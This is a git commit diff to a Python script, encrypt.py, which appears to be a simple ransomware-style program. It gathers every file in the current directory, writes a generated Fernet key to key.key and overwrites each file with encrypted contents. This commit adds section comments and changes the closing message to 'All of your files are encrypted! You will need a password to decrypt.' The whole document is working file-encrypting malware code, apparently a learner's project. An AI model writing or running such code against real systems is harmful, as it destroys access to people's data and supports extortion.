9ba036ca6ef33876ca6c8ec3f4ea864a227516cd
Benson <thongbenson010499@gmail.com>
2022-06-16 00:55:44 -0700

    Added comments

--- encrypt.py
+++ encrypt.py
@@ -2,20 +2,32 @@ import os
 from cryptography.fernet import Fernet
 
 files = []
+# ========================================================= #
+# -Grab file in current directory and append to a list      #
+# -Filtering python files, created files, and folders       #
+# ========================================================= #
 for file in os.listdir():
     if file == "encrypt.py" or file == "key.key" or file == "decrypt.py":
         continue
-    # This checks to see if the file in the directory is a file.
+
     if os.path.isfile(file):
         files.append(file)
-print(files)
+print(f"These files will be encrypted: {files}")
 
+# ========================================================= #
+#       Generate an encryption key using Fernet             #
+# ========================================================= #
 key = Fernet.generate_key()
 
-# Creates a file .key and call that object the key. Can write binary.
+# ========================================================= #
+#       Put the encryption key in a .key file               #
+# ========================================================= #
 with open("key.key", "wb") as thekey:
-    thekey.write(key)                   # After open, will write the saved key value into the file.
+    thekey.write(key)
 
+# ========================================================= #
+#  Encrypting files and write back encryption in each file  #
+# ========================================================= #
 for file in files:
     with open(file, "rb") as f:
         contents = f.read()
@@ -23,4 +35,4 @@ for file in files:
     with open(file, "wb") as f:
         f.write(contents_encrypted)                     # write it back as an encrypted file
 
-print("All of your files are encrypted!")
+print("All of your files are encrypted! You will need a password to decrypt. ")
